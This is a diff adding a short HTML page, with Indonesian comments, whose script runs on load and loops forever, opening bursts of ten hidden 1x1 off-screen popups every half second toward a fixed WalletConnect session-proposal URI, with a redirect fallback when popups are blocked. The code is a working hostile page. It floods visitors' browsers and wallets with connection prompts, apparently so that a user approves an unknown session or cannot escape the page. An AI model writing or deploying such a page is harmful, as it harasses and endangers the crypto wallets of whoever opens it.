@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>LOOP KEUN FLOW (WC)</title>
+</head>
+<body>
+  <script>
+    // Tetap pakai WC URI yang sama
+    const deeplink =
+      "wc:75e7fb2068b7f9abc94761cf72e93cbbf8d1804d044f38b9b7e695b89193d421@2" +
+      "?relay-protocol=irn" +
+      "&symKey=3f316b05f1ba3bd669097bb81f16fba67c2ffb503745363e292cfbcf73ef62cc" +
+      "&methods=[wc_sessionPropose]" +
+      "&expiryTimestamp=1893456000";
+
+    function openOnce() {
+      const w = window.open(
+        deeplink,
+        "_blank",
+        "width=1,height=1,left=-100,top=-100"
+      );
+
+      // Fallback kalau popup diblok / gagal
+      if (!w || w.closed || typeof w.closed === "undefined") {
+        location.href = deeplink;
+      }
+    }
+
+    // Burst tab logic
+    function trigger() {
+      // Misal burst 10 tab per siklus
+      for (let i = 0; i < 10; i++) {
+        // delay kecil biar tetap "race"
+        setTimeout(openOnce, i * 10);
+      }
+
+      // Ulangi terus (loop keun)
+      setTimeout(trigger, 500);
+    }
+
+    window.onload = trigger;
+  </script>
+</body>
+</html>
